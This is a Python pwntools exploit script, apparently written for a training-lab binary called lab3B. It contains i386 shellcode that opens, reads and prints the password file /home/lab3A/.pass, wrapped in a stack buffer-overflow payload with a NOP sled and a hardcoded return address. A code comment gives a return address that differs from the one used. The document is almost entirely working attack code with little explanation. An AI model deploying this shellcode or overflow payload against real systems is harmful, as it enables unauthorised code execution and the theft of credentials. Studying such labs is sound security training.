from pwn import *
import binascii
import struct

context(arch ='i386', os ='linux')

inst= [
    "xor ecx, ecx",
    "push 0x73",
    "push 0x7361702e", # [!] <--- Flag file path
    "push 0x2f413362", # [!] <--- Flag file path
    "push 0x616c2f65", # [!] <--- Flag file path
    "push 0x6d6f682f", # [!] <--- Flag file path
    "mov ebx, esp",
    "xor eax, eax",
    "mov al, SYS_open",
    "int 0x80",

    "mov ebx, eax",
    "xor eax, eax",
    "mov al, SYS_read", # [!] <--- Read from file
    "mov ecx, esp",
    "xor edx, edx",
    "mov dl, 0x20",
    "int 0x80",

    "xor eax, eax",
    "mov al, SYS_write", # [!] <--- Write to stdout
    "mov bl, 1",
    "mov ecx, esp",
    "int 0x80",

    "xor eax, eax",
    "push 0xb7e3ca83", # [!] <--- Return to main()
    "ret" # [!] <--- Return to main()
]

sh = ''

for instr in inst:
    sh += asm(instr)

shellcode_bytes = binascii.unhexlify(sh.encode('hex'))

# "A" * 156 + \x70\xf6\xff\xbf [RA] + NOP * 300 + Shellcode
full_payload = "A" * 156 + struct.pack('<I', 0xBFFFF6D4) + '\x90' * 300 + shellcode_bytes

# cat /tmp/input | ./lab3B
with open('/tmp/input', 'wb') as fp:
    fp.write(full_payload)
